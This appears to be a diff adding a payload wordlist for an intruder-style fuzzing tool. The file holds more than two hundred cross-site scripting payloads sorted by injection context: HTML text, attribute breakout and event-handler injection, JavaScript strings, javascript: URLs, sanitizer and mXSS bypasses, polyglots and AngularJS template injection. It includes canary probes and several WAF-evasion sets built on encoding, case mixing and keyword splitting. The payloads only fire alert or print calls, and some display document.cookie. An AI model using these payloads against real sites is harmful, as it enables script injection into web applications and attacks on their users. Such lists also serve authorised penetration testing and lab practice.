@@ -1,0 +1,234 @@
+# ==================================================================
+#  XSS PAYLOADS  —  single file, all variations (transmit-safe raw)
+#  One payload per line. "#" lines are comments (pyintruder skips them).
+#  Swap alert(1) -> print() / confirm(1) / alert(document.domain) as needed.
+#  Chosen to transmit intact when injected RAW (no '&', no '#', no literal '+').
+# ==================================================================
+# ---- 0. CANARY probes — FIRE THESE FIRST (fixes the false-positive problem) ----
+# ---- In pyintruder set grep/regex to:  xq9z   Only responses that REFLECT the ----
+# ---- token get flagged (not every 200). Then read those rows: if < > " ' appear ----
+# ---- UNENCODED next to xq9z, that spot is injectable -> use the matching section. ----
+xq9z
+xq9z'"><
+xq9z"><svg onload=alert(1)>
+xq9z'><svg onload=alert(1)>
+"><svg onload=alert(1)>xq9z
+'-alert(1)-'xq9z
+</script><svg onload=alert(1)>xq9z
+
+# ---- 1. HTML text context (input between tags: <p>HERE</p>) ----
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=1 onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<iframe onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+# ---- 2. Attribute breakout: CLOSE the quote+tag, then a new element ----
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><svg/onload=alert(1)>
+'><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+'><svg onload=alert(1)>
+`><img src=x onerror=alert(1)>
+"><body onload=alert(1)>
+"><iframe src=javascript:alert(1)>
+"></title><script>alert(1)</script>
+"></textarea><script>alert(1)</script>
+"></style><script>alert(1)</script>
+"></script><script>alert(1)</script>
+--!><svg onload=alert(1)>
+</title><svg onload=alert(1)>
+</textarea><svg onload=alert(1)>
+</noscript><svg onload=alert(1)>
+
+# ---- 3. Attribute injection: close ONLY the quote, add an event handler ----
+# ---- (input lands in <input value="HERE">; you keep the tag intact) ----
+# ---- "onmouseover="alert(1) is the classic PortSwigger answer ----
+"onmouseover="alert(1)
+"onmouseover="alert(1)"x="
+"onmouseenter="alert(1)
+"onmouseleave="alert(1)
+"onmousemove="alert(1)
+"onmousedown="alert(1)
+"onmouseup="alert(1)
+"onclick="alert(1)
+"ondblclick="alert(1)
+"onauxclick="alert(1)
+"oncontextmenu="alert(1)
+"onpointerover="alert(1)
+"onpointerenter="alert(1)
+"onpointerdown="alert(1)
+"onpointerup="alert(1)
+"onpointermove="alert(1)
+"onfocus="alert(1)" autofocus="
+"onfocus="alert(1)"autofocus="x
+"onblur="alert(1)
+"oninput="alert(1)
+"onchange="alert(1)
+"onkeydown="alert(1)
+"onkeyup="alert(1)
+"onkeypress="alert(1)
+"onwheel="alert(1)
+"onscroll="alert(1)
+"ondrag="alert(1)
+"ondrop="alert(1)
+"oncopy="alert(1)
+"oncut="alert(1)
+"onpaste="alert(1)
+"onselect="alert(1)
+"onbeforeinput="alert(1)
+"ontoggle="alert(1)
+"onanimationstart="alert(1)
+"ontransitionend="alert(1)
+" onmouseover=alert(1) x="
+" autofocus onfocus=alert(1) x="
+
+# ---- 3b. Same, single-quote context (<input value='HERE'>) ----
+'onmouseover='alert(1)
+'onclick='alert(1)
+'onfocus='alert(1)' autofocus='
+'onpointerover='alert(1)
+' onmouseover=alert(1) x='
+' autofocus onfocus=alert(1) x='
+
+# ---- 4. Unquoted attribute (<input value=HERE>): add a handler after a space ----
+x onmouseover=alert(1)
+x onclick=alert(1)
+x onfocus=alert(1) autofocus
+x onpointerover=alert(1)
+ autofocus onfocus=alert(1)
+
+# ---- 5. Inside a JS string / <script> block: break the string/statement ----
+'-alert(1)-'
+'-alert(1)//
+';alert(1)//
+';alert(1);//
+';alert(1)-'
+";alert(1)//
+"-alert(1)-"
+"}alert(1);{"
+'}alert(1);{'
+'};alert(1)//
+`-alert(1)-`
+`;alert(1)//
+${alert(1)}
+</script><script>alert(1)</script>
+</script><img src=x onerror=alert(1)>
+
+# ---- 6. URL / href / src context (javascript: scheme) ----
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:print()
+Javascript:alert(1)
+JaVaScRiPt:alert(1)
+ javascript:alert(1)
+javascript:alert(1)//
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# ---- 7. Self-firing (no user interaction needed) ----
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<button autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<body onpageshow=alert(1)>
+<body onhashchange=alert(1)>
+<img src=x onerror=alert(1)>
+<image src=x onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg><animatetransform onbegin=alert(1) attributeName=x>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)></xss>
+<marquee loop=1 onfinish=alert(1)>x</marquee>
+
+# ---- 8. WAF bypass: no parentheses ----
+<img src=x onerror=alert`1`>
+<script>alert`1`</script>
+<svg onload=alert`1`>
+<img src=x onerror=setTimeout`alert\x281\x29`>
+<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
+<svg onload="window.onerror=eval;throw'=\x28alert\x281\x29\x29'">
+
+# ---- 9. WAF bypass: no spaces / slash separators ----
+<svg/onload=alert(1)>
+<img/src/onerror=alert(1)>
+<svg//onload=alert(1)>
+<svg/onload=alert(1)//
+<img/src=x/onerror=alert(1)>
+
+# ---- 10. WAF bypass: mixed case / broken keyword ----
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x oNeRrOr=alert(1)>
+<img SRC=x OnErRoR=alert(1)>
+<scr<script>ipt>alert(1)</script>
+<<script>alert(1);//<</script>
+<img src=x onerror=alert(1)>
+
+# ---- 11. Encoding (URL / unicode) — transmit-safe, single or double URL-encode ----
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg onload=alert(1)%3E
+%3Cimg src=x onerror=alert(1)%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+<img src=x onerror=alert(1)>
+<img src=x onerror=eval('\x61lert(1)')>
+
+# ---- 12. Alternative tags & sinks ----
+<isindex type=image src=1 onerror=alert(1)>
+<form><button formaction=javascript:alert(1)>x</button></form>
+<input type=image src=x onerror=alert(1)>
+<x contenteditable onbeforeinput=alert(1)>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<table background=javascript:alert(1)>
+<base href=javascript:alert(1)//>
+<meta http-equiv=refresh content=0;url=javascript:alert(1)>
+<link rel=import href=data:text/html,<script>alert(1)</script>>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+# ---- 13. mXSS / namespace confusion (HTML-sanitizer / innerHTML bypass) ----
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<svg><foreignobject><iframe src=javascript:alert(1)>
+<template><script>alert(1)</script></template>
+<xmp><img src=x onerror=alert(1)>
+
+# ---- 14. alert() blocked -> same proof, different call (print() / keyword-split) ----
+<script>print()</script>
+<img src=x onerror=print()>
+<svg onload=print()>
+"onmouseover="print()
+"><img src=x onerror=print()>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>self[atob('YWxlcnQ=')](1)</script>
+<script>top['ale'.concat('rt')](1)</script>
+<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>
+<script>setTimeout('alert(1)')</script>
+<script>Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+
+# ---- 15. Polyglots (one string across many contexts) — transmit-safe ----
+'">><marquee><img src=x onerror=alert(1)></marquee>"></plaintext></|><plaintext/onmouseover=alert(1)>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='//"//onmouseover=alert(1)//'>
+"><svg><animatetransform onbegin=alert(1) attributeName=x>
+
+# ---- 16. Client-side template injection (AngularJS {{ }}) ----
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{[].pop.constructor('alert(1)')()}}
